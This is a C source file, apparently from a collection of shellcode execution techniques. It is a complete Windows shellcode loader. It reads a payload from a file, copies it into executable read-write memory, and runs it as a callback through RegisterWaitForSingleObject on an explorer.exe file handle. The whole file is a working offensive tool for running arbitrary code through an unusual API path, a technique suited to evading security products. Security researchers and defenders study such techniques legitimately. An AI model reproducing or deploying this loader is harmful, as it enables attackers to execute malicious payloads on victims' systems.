// Wra7h/FlavorTown
// Written/Compiled: Visual Studio 2022
// Usage: this.exe <shellcode file>

#include <stdio.h>
#include <windows.h>

BOOL ReadContents(PWSTR Filepath, PCHAR* Buffer, PDWORD BufferSize);

INT wmain(INT argc, WCHAR* argv[])
{
	BOOL Ret = FALSE;
	DWORD SCLen = 0;
	PCHAR Shellcode = NULL;

	HANDLE hFile = NULL;
	HANDLE hNewWaitObj = NULL;

	if (argc != 2)
	{
		printf("Usage: RegisterWaitForSingleObject.exe C:\\Path\\To\\Shellcode.bin");
		goto CLEANUP;
	}

	Ret = ReadContents(argv[1], &Shellcode, &SCLen);
	if (!Ret)
		goto CLEANUP;

	PVOID hAlloc = VirtualAlloc(NULL, SCLen,
		MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

	memcpy(hAlloc, Shellcode, SCLen);

	hFile = CreateFile(L"C:\\Windows\\explorer.exe", GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING,
	 FILE_ATTRIBUTE_NORMAL | FILE_FLAG_OVERLAPPED, NULL);

	RegisterWaitForSingleObject(&hNewWaitObj, hFile, (WAITORTIMERCALLBACK)hAlloc, NULL, 0, WT_EXECUTEONLYONCE);

	Sleep(1000);

CLEANUP:
	if (Shellcode)
		free(Shellcode);

	if (hFile)
		CloseHandle(hFile);

	if (hNewWaitObj)
		UnregisterWait(hNewWaitObj);

	return 0;
}

BOOL ReadContents(PWSTR Filepath, PCHAR* Buffer, PDWORD BufferSize)
{
	FILE* f = NULL;
	_wfopen_s(&f, Filepath, L"rb");
	if (f)
	{
		fseek(f, 0, SEEK_END);
		*BufferSize = ftell(f);
		fseek(f, 0, SEEK_SET);
		*Buffer = malloc(*BufferSize);
		fread(*Buffer, *BufferSize, 1, f);
		fclose(f);
	}

	return (*BufferSize != 0) ? TRUE : FALSE;
}
